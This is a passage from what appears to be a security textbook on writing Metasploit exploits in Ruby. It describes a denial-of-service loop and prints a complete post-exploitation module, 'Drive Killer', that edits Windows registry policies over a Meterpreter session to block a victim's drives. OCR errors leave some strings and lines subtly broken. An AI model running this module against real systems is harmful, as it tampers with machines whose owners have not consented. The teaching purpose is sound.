- pgno: 372
  md: "The code beginning at the **while** statement is where the real essence of\
    \ this exploit occurs. It is here that we are trying to connect to the target.\
    \ If we can successfully connect, then we send over random buffer contents. And\
    \ since this is in a loop, as long as we are connected, we keep sending data.\
    \ At some point, this should overwhelm the server. And at that point, we disconnect.\n\
    \nThis is a simple exploit, and one that won’t work on all platforms. But it is\
    \ easy to understand, and it is one you can modify further, should you wish to\
    \ do so.\n\nThere are several items from this exploit we can generalize to all\
    \ exploits. Metasploit has several libraries. The MSF Core is the basic API and\
    \ you will always see this in exploits. The msf/core contains a lot of things,\
    \ as you might guess. There are functions in there that you will use frequently.\
    \ A few that will be used a great deal are **run_host**, **connect**, and **send_raw_request**.\
    \ REX is another library you might see frequently in exploits. It has functions\
    \ like setting up connections, formatting, etc.\n\nThe class names can be anything\
    \ you wish, usually a single word. Some people just name their classes Metasploit1,\
    \ Metasploit2, etc. In the initialize method you will describe the exploit. I\
    \ did not fill in all the items you can have in this section.\n\n# Writing Your\
    \ First Exploit\n\nIn this section, we will look at a rather simple exploit. A\
    \ simple search of the web will provide you additional exploits you can experiment\
    \ with. Each of these, like any Metasploit exploit, will only work on certain\
    \ targets. It might not work on a specific target. The goal in this chapter is\
    \ to get you accustomed to writing exploits in Ruby.\n\nThis is a simple exploit,\
    \ and versions of this show up in many different sources. That is because it is\
    \ so short and easy to understand but effective. Note immediately the requirement\
    \ for msf/core/post/windows/registry. That should indicate that this exploit will\
    \ only work on Windows. As with exploits in the previous section, we will dissect\
    \ this one after you have a chance to read it.\n\n```\n```ruby\nrequire 'msf/core'\n\
    require 'msf/core/post/windows/registry'\nrequire 'rex'\n\nclass Exploit2 < Msf::\
    \ Post\n  include Msf:: Post:: Windows:: Registry\n\n#basic metasploit description\n\
    def initialize\nsuper(\n  'Name' => 'Drive Killer',\n  'Description' =>'This restricts\
    \ access to a drive',\n  'Author' => 'open' )\nend\n```\n```"
  merge: -1
  img_proc: true
- pgno: 373
  md: "```\n#basic get the drive letter\nregister_options(\n[ OptString.new(' DriveName',\
    \ [ true, 'Please enter the Drive Letter' ]) ], self.\nclass)\nend\n\n# now the\
    \ meat of this exploit\ndef run\n    drive_int = drive_string( datastore[' DriveName'])\n\
    \    key1 = \"HKLM\\\\ Software\\\\ Microsoft\\\\ Windows\\\\ CurrentVersion\\\
    \\ Policies\\\\\nExplorer\"\n\n    #find out if this key exists. If it does not,\
    \ then create it\n    exists = meterpreter_registry_key_exist?( key1)\n\n    if\
    \ not exists\n    registry_createkey( key1)\n\n    # now let's change some registry\
    \ values!\n\n    meterpreter_registry_setvaldata( key1,' NoViewOnDrives', drive_int.to_s,\n\
    ' REG_DWORD', REGISTRY_VIEW_NATIVE)\n\n    meterpreter_registry_setvaldata( key1,'\
    \ NoDrives', drive_int.to_s,' REG_\nDWORD', REGISTRY_VIEW_NATIVE)\n\n    end\n\
    \nend\n```\n\nThe first thing to note is that this exploit has three different\
    \ **require** statements. It requires the post exploit /windows/registry because\
    \ it utilizes that to get access to drive information. This is a post exploit,\
    \ that means you have to already have a session with that machine. Then you can\
    \ use this to attempt to disable drives.\n\nThe real meat of this exploit is in\
    \ the run section. This is going to first find out if the registry key we need\
    \ exists. It should exist, but if for some reason it does not, we will create\
    \ it. Note that the **meterpreter_registry_setvaldata** can be used to set the\
    \ value on any registry key.\n\nYou may also notice this one has something new:\
    \ **register_options**. Remember when you typed **show options** for an exploit?\
    \ Well, this is what will show when someone types **show options** for your exploit."
